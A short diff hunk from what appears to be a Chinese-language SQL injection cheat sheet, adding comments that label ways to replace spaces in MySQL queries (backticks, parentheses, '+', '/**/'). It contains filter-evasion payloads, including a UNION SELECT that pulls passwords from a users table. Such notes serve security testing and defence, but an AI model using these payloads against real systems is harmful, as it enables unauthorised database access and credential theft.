@@ -46,8 +46,15 @@ where id=.1union/*.1*/select@1
 在MySQL中可替换为：
 
 ```
+# 反引号
 SQL> select * from`user`;
+
+# 括号
 SQL> 'and(true)like(false)union(select(pass)from(users))#
+
+# +
+
+# /**/
 ```
 
 空格可以使用如下替代：
